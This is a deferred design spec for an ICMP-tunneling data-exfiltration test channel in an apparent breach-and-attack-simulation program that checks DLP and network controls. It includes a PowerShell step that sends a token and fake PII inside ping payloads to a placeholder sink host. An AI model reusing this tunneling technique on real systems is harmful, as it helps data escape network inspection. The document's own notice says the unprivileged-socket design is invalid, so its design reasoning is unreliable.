# ICMP Tunneling Exfiltration Channel — Design

> **STATUS: DEFERRED 2026-09-01 — the unprivileged-socket architecture below
> is invalidated. Do not implement this spec as written; read this notice in
> full before attempting any variant of it.**
>
> The core assumption — that `golang.org/x/net/icmp.ListenPacket("udp4",
> addr)` (the unprivileged Linux "ping socket") can act as a **server**,
> receiving unsolicited incoming echo requests from other hosts — is false.
> This was proven empirically, not just reasoned about, via a genuine
> cross-container test:
>
> 1. A probe program bound `icmp.ListenPacket("udp4", "0.0.0.0")` in one
>    Docker container and logged every packet its own `ReadFrom` received.
> 2. A **separate** container on the same network sent 3 real ICMP echo
>    requests to the probe container's IP. All 3 got valid replies —
>    `ping` reported 0% packet loss.
> 3. The probe's own log showed nothing past "listening" — its `ReadFrom`
>    never received any of those 3 packets.
>
> The replies came from **the receiving container's own kernel**, which
> auto-answers ICMP echo requests addressed to itself — ordinary OS
> behavior, completely independent of any userspace ping-socket. The
> `udp4` mechanism (and the `net.ipv4.ping_group_range` sysctl gating it)
> is a **client-side** facility: it lets an unprivileged process send a
> ping and match the reply back to itself via a kernel-assigned
> identifier. It was never designed to receive arbitrary incoming echo
> requests from other hosts, which is what a server role needs.
>
> This session's Task 1 acceptance test (sending to `127.0.0.1` and
> reading back a reply) had exactly this same blind spot and could not
> have caught the flaw — a loopback self-test can never distinguish "my
> code replied" from "the kernel replied to itself." Only a genuine
> cross-host test exposes it. If ICMP tunneling is ever revisited, any new
> acceptance test **must** repeat the cross-container methodology above,
> not a loopback-only test.
>
> **The only mechanism that can genuinely receive incoming ICMP echo
> requests is a raw ICMP socket (`CAP_NET_RAW`)** — `ip4:icmp` mode
> instead of `udp4`. That capability was deliberately not granted: it
> lets a process craft/sniff arbitrary raw IP packets, a materially larger
> privilege than anything else this program has requested, for a channel
> whose payload is only ~150 bytes and whose exfiltration technique is
> already covered in spirit by five other, non-privilege-expanding
> channels. **Do not add `CAP_NET_RAW` to the normal orchestrator
> container to revive this channel.** If ICMP tunneling becomes
> strategically important later, it should be investigated as a
> separately security-reviewed deployment mode with its own minimal
> component holding `CAP_NET_RAW` — never folded into the main
> orchestrator's privilege set. See
> `project_dlp_exfiltration_channel_roadmap.md` (memory) for the current
> roadmap state.
>
> Also explicitly rejected: reporting a channel "success" whenever the
> kernel's own auto-reply comes back. That would break this program's
> sink-primary verdict model everywhere else — a kernel Echo Reply proves
> only that the target host is reachable, never that the BAS sink
> received, validated, or recorded a payload.
>
> Everything below this notice is preserved as a historical record of the
> design and the (invalid) reasoning that led to it — useful context for
> understanding what was tried, not a spec to build from.

## Problem

Sixth channel of the DLP exfiltration maturity program, following HTTPS, DNS
tunneling, SFTP, SMTP, and cloud storage. ICMP tunneling is a distinct
network-layer exfiltration technique — data leaving inside ICMP echo
request/reply payloads rather than any application-layer protocol — that
tests whether network controls (DLP, IDS/IPS, firewalls with deep packet
inspection) catch data leaving via a protocol most content-inspection tooling
doesn't examine at all.

Unlike every application-layer channel built so far, ICMP requires either a
privileged raw socket (`CAP_NET_RAW` or root) or the Linux kernel's
unprivileged "ping socket" facility — a genuinely different operating-system
interaction than opening a TCP/UDP listener. This design resolves that
constraint directly (see Decisions) and was reviewed and corrected before
being treated as implementation-ready: the exact `golang.org/x/net/icmp` API
call was verified against the real installed package source (`go doc` plus
the package's own example test), not assumed from general knowledge.

## Decisions

Confirmed during brainstorming (including a technical review pass that
corrected/verified the socket approach before this spec was finalized):

- **Unprivileged Linux "ping socket," not `CAP_NET_RAW`.** The orchestrator
  container currently grants only `NET_BIND_SERVICE` (confirmed in
  `packaging/compose/docker-compose.yml`) and runs `USER nonroot` on
  `gcr.io/distroless/static-debian12` (confirmed Linux). Granting
  `CAP_NET_RAW` would let the process craft/sniff arbitrary raw IP packets —
  a materially larger capability than anything this program has requested so
  far. Linux instead supports `SOCK_DGRAM` + `IPPROTO_ICMP` "ping sockets,"
  gated by the `net.ipv4.ping_group_range` sysctl, which is per-network-
  namespace and settable directly on the container via Docker Compose's
  `sysctls:` key — no `privileged: true`, no `CAP_NET_RAW`.
- **`golang.org/x/net/icmp.ListenPacket("udp4", addr)`, verified not
  assumed.** This is the exact documented non-privileged API
  (`go doc golang.org/x/net/icmp ListenPacket`: *"For non-privileged
  datagram-oriented ICMP endpoints, network must be 'udp4' or 'udp6' ...
  Currently only Darwin and Linux support this"*), and the package's own
  `ExamplePacketConn_nonPrivilegedPing` test explicitly notes on Linux *"you
  may need to adjust the net.ipv4.ping_group_range kernel state"* —
  confirming the sysctl requirement directly from the library authors, not
  inferred. `golang.org/x/net` is already an indirect dependency in
  `orchestrator/go.mod` (`v0.57.0`); this channel makes it a direct one, no
  new third-party dependency added.
- **Task 1 of the implementation plan is a real acceptance test against the
  live container, not an assumption the rest of the channel is built on
  blind.** Per the technical review: prove the unprivileged socket actually
  opens, actually exchanges a real echo request/reply, and actually
  round-trips a byte-for-byte payload inside the real deployment environment
  *before* building token validation, receipt persistence, or the scenario
  step on top of it. See Design §5 for the full acceptance checklist.
- **Single-packet payload, no chunking.** The synthetic multi-type record
  (~150 bytes) fits comfortably inside one ICMP echo request well under any
  practical MTU — unlike DNS tunneling's 63-byte label constraint, no
  multi-request chunking/reassembly is needed. This is architecturally
  simpler than the DNS channel.
- **Wire response and token validation are fully decoupled — the listener
  always behaves like an ordinary host to any observer, whether or not the
  token turns out to match.** Per the technical review's explicit
  architectural point: the listener (1) validates the packet is a
  well-formed, size-bounded echo request, (2) unconditionally replies with a
  matching Echo Reply (same identifier, sequence, and payload echoed back —
  standard ICMP echo behavior, nothing to distinguish this from a real ping
  response), and only *then*, independently, (3) checks whether the payload's
  embedded token matches a live run and persists a receipt if so. A rejected
  token never produces a different wire-visible response than an accepted
  one — the two paths are genuinely separate code paths, not a single
  branch that sometimes skips the reply.
- **Receipt persistence remains the sole source of truth for the BAS
  verdict** — a successful ICMP exchange (the agent's `Ping.Send()` reporting
  `Success`) is never the graded signal, exactly matching every other
  channel's `DLP_OBSERVATION:`-is-diagnostic-only convention. This was
  already this program's standing rule; stated explicitly here because
  ICMP's decoupled reply/validation design makes it especially easy to
  correctly reason about why.
- **Token correlation: the token lives directly in the echo request's raw
  payload bytes**, not encoded into any ICMP header field (identifier/
  sequence are far too small and are also needed for the reply to look like
  a genuine echo exchange). Reuses the existing 32-byte/64-hex `{{SINK_TOKEN}}`
  unchanged — no new token variant, same reasoning as every channel except
  DNS's label-length-driven exception.
- **Client: `System.Net.NetworkInformation.Ping`, no tool-presence check
  needed.** `[System.Net.NetworkInformation.Ping]::new().Send(address,
  timeout, buffer)` is a built-in .NET class present in both Windows
  PowerShell 5.1 (.NET Framework) and PowerShell 7+ (.NET/Core) — no
  `Add-Type`, no P/Invoke, no bundled helper binary, matching the "always
  there" category `Send-MailMessage`/`Invoke-RestMethod` already established
  for SMTP/cloud storage. `Send`'s `buffer` parameter carries genuinely
  arbitrary payload bytes (not the fixed/short padding `Test-Connection`/
  `ping.exe` expose), and the returned `PingReply.Buffer` reads back whatever
  the remote host echoed.
- **MITRE technique: T1095 — Non-Application Layer Protocol** (tactic:
  command-and-control), confirmed against this repo's own bundled ATT&CK
  enrichment data — its own detection guidance explicitly names ICMP as an
  example ("Analyze network traffic for ICMP messages or other protocols
  that contain abnormal data..."). No dedicated "exfiltration over ICMP"
  sub-technique exists in ATT&CK; T1095 is the standard mapping real-world
  ICMP tunneling tooling uses. Matches DNS tunneling's own precedent of
  tagging `mitre_phases: [..., command-and-control]` even in this
  exfiltration-testing context.
- **Logging bar tightened beyond prior channels': never log the token,
  not just never the payload.** Every prior channel's stated rule was "log
  the token (once matched) plus size and hash." Per the technical review,
  ICMP's own logging omits the token too — only size and hash. This is a
  deliberate, slightly more conservative posture for this specific channel;
  it is not a retroactive change to any already-shipped channel.
- **No AUTH / access-control checking** — same "testing content/protocol
  inspection, not access control" philosophy every prior channel follows.
  Any well-formed echo request gets a reply; only receipt persistence is
  gated on a real token match.

## Design

### 1. Package structure

New package `internal/icmpsink`, mirroring `internal/dnssink`'s isolation —
its own listener lifecycle (`NewListener`/`Serve`/`Status()`/`StartListener`,
identical shape to `internal/sftpsink`'s), never merged into `internal/api`'s
HTTP sink or any other channel's package.

```go
// internal/icmpsink/listener.go
func NewListener(addr string, db *pgxpool.Pool) (*Listener, error) {
	conn, err := icmp.ListenPacket("udp4", addr)
	if err != nil {
		return nil, fmt.Errorf("bind %s: %w", addr, err)
	}
	l := &Listener{conn: conn, db: db, limiter: newRateLimiter(rateLimitPerSecond, time.Second)}
	l.setStatus(Status{State: "running", Bind: conn.LocalAddr().String()})
	return l, nil
}
```

`addr` for `icmp.ListenPacket("udp4", addr)` is a bare IP address (e.g.
`"0.0.0.0"`), not a `host:port` pair — ICMP has no port concept; the
`udp4`-mode ping socket uses the process's ICMP identifier for demultiplexing
instead, which the listener code must not confuse with a TCP/UDP-style port
placeholder.

### 2. Wire handling — reply and validation as separate steps

```go
// internal/icmpsink/listener.go
func (l *Listener) Serve(ctx context.Context) {
	go func() {
		<-ctx.Done()
		_ = l.conn.Close()
	}()
	buf := make([]byte, 1500)
	for {
		n, peer, err := l.conn.ReadFrom(buf)
		if err != nil {
			if ctx.Err() != nil {
				return
			}
			continue
		}
		l.handlePacket(ctx, buf[:n], peer)
	}
}

func (l *Listener) handlePacket(ctx context.Context, raw []byte, peer net.Addr) {
	host, _, err := net.SplitHostPort(peer.String())
	if err != nil {
		host = peer.String()
	}
	if !l.limiter.allow(host) {
		return
	}

	rm, err := icmp.ParseMessage(1, raw) // protocol 1 = ICMP (IPv4)
	if err != nil || rm.Type != ipv4.ICMPTypeEcho {
		return // not a well-formed echo request -- silently drop, same as a real host would for garbage
	}
	echo, ok := rm.Body.(*icmp.Echo)
	if !ok || len(echo.Data) > MaxPayloadBytes {
		return // oversized or malformed body -- drop before any reply, before any buffering
	}

	// Step 1: reply unconditionally, exactly like a real host's ICMP stack
	// would -- this happens whether or not the payload's token turns out to
	// match anything. Nothing about the wire response ever reveals whether
	// validation succeeds.
	reply := icmp.Message{
		Type: ipv4.ICMPTypeEchoReply, Code: 0,
		Body: &icmp.Echo{ID: echo.ID, Seq: echo.Seq, Data: echo.Data},
	}
	wb, err := reply.Marshal(nil)
	if err == nil {
		_, _ = l.conn.WriteTo(wb, peer)
	}

	// Step 2: independently, validate the token and persist a receipt if it
	// matches. This is genuinely a second, separate code path -- not a
	// branch inside Step 1 that sometimes skips the reply.
	token, ok := extractToken(echo.Data)
	if !ok || !tokenExists(ctx, l.db, token) {
		return
	}
	_ = writeReceipt(ctx, l.db, token, host, echo.Data)
}
```

`extractToken` parses the fixed shape the scenario step writes: the first 64
bytes of `echo.Data` are the hex token, followed by the synthetic record.
`MaxPayloadBytes` (see Design §4) bounds the whole echo body, including the
token prefix.

### 3. Token generation and placeholder substitution

`issueSinkTokensAndSubstitute` (`internal/api/dlp_sink.go`) gains one new
placeholder branch for `{{SINK_ICMP_HOST}}`, structured like every prior
channel's host placeholder — no `{{SINK_ICMP_PORT}}` is needed since ICMP has
no port concept:

```go
if strings.Contains(steps[i].Command, "{{SINK_ICMP_HOST}}") {
    steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_ICMP_HOST}}", icmpSinkHost(publicBaseURL))
}
```

`icmpSinkHost` mirrors `sftpSinkHost`/`smtpSinkHost`/`cloudSinkHost` exactly:
an optional `SINK_ICMP_HOST` environment override, otherwise the same
`dnsServerHost()` derivation every channel's host placeholder already uses.

### 4. Security hardening

Same bar as every prior channel, adapted for a connectionless, single-packet
protocol:

- `MaxPayloadBytes = 1024` — a firm ceiling on the echo body (token prefix +
  synthetic record is ~215 bytes; this leaves headroom without approaching
  any fragmentation-relevant size). Enforced by dropping the packet *before*
  any reply is sent or any buffer grows, per Design §2.
- Coarse per-source-IP rate limiting (same unexported `rateLimiter` shape
  duplicated from every sibling channel).
- No idle-session timeout — ICMP echo is stateless request/response, there is
  no session to time out (matches the spec's own N/A classification).
- Logging omits the token (tightened beyond every prior channel's bar, see
  Decisions) — only payload size and SHA-256 hash are ever logged.
- No filesystem writes, no outbound network calls of any kind from the
  handler itself beyond the one echo reply.

### 5. Task 1 acceptance checklist (verify before building anything else)

This is the first thing the implementation plan proves, against the real
container, before any token validation or receipt-writing code is written:

1. The container's network namespace reports `net.ipv4.ping_group_range`
   including the `nonroot` user's group (after the `docker-compose.yml`
   `sysctls:` change).
2. `icmpsink.NewListener` succeeds with no `CAP_NET_RAW` granted.
3. The opened socket is genuinely the unprivileged `udp4` ping-socket mode
   (not silently falling back to something else).
4. A real `[System.Net.NetworkInformation.Ping]::Send()` call from a
   Windows client reaches the listener.
5. The listener returns a valid, parseable Echo Reply.
6. The reply's payload is byte-for-byte identical to what was sent.
7. A request carrying a live, matching token results in successful token
   validation.
8. That validation results in a persisted `dlp_sink_receipts` row.
9. A request carrying a token that was never issued (or already
   expired/invalidated) produces no receipt — while Step 5's reply still
   happens normally.
10. An oversized payload (`> MaxPayloadBytes`) is rejected before any
    buffering or reply.
11. Rate limiting actually throttles a source IP that exceeds the configured
    rate.
12. No log line, at any log level this handler can reach, ever contains the
    token or the payload content.

### 6. V1 scenario content

New scenario `scenarios/dlp-exfiltration-icmp-tunnel.yaml`, one step,
`technique_id: T1095`. PowerShell:

```yaml
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $payload = [System.Text.Encoding]::ASCII.GetBytes("$token$csvContent")
      try {
        $ping = [System.Net.NetworkInformation.Ping]::new()
        $reply = $ping.Send("{{SINK_ICMP_HOST}}", 5000, $payload)
        Write-Output "DLP_OBSERVATION: icmp_ping_status=$($reply.Status)"
        Write-Output "EXEC T1095: ICMP tunneling exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-ICMP]"
      } catch {
        Write-Output "DLP_OBSERVATION: icmp_ping_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1095: ICMP tunneling exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-ICMP]"
      }
      # DLP_OBSERVATION lines are diagnostic evidence only -- a Success
      # status here only proves an echo reply came back (which the listener
      # always sends, matched or not), never that the token was accepted.
      # This step's graded verdict comes entirely from whether a receipt
      # was persisted, resolved server-side by internal/icmpsink +
      # internal/verifysync + internal/reporting's sink-primary dlpVerifier.
```

New detection-profile entry (`dlp-icmp-tunnel-block`) added to
`scenarios/detection-profiles/windows_dlp_exfiltration.yaml`, matching the
existing `outcome_family: dlp` / `expected_outcome: Block` shape.

## Testing

- Go unit tests in `internal/icmpsink`: token extraction from a well-formed
  echo body, oversized-payload rejection, malformed/non-echo message
  rejection, rate limiter behavior (identical test shape to every sibling
  channel's).
- The Task 1 acceptance checklist (Design §5) as real integration tests
  against a live `icmpsink.NewListener` bound in the actual test-run
  environment — not mocked, since the entire point is proving the real
  socket mechanism works.
- `internal/api/dlp_sink_test.go`: `{{SINK_ICMP_HOST}}` substitution,
  confirming the 32-byte token path is reused unchanged, and the
  orphaned-second-token regression test every channel since SFTP has
  included from the start.
- Regression confirmation: full `internal/verifysync` and
  `internal/reporting` suites re-run to prove neither needs any change (same
  "only checks whether any receipt exists" reasoning as every prior channel).

## Out of scope

- IPv6 (`udp6`/ICMPv6) — V1 is IPv4 only, matching every prior channel's
  scope (no channel in this program has targeted IPv6).
- Chunked/multi-packet payloads — not needed at this payload size (Design
  §4); if a future need for larger payloads emerges, that is a distinct
  future decision, not assumed here.
- Webhook-style channels (Slack/MS Teams/GitHub/GitLab), Telnet — next in
  priority order per the DLP exfiltration channel roadmap, each its own
  sub-project.
- A dashboard/UI surface for the ICMP sink's health status — `Status()` is
  queryable server-side, matching every prior channel's precedent of no
  dedicated UI for this.
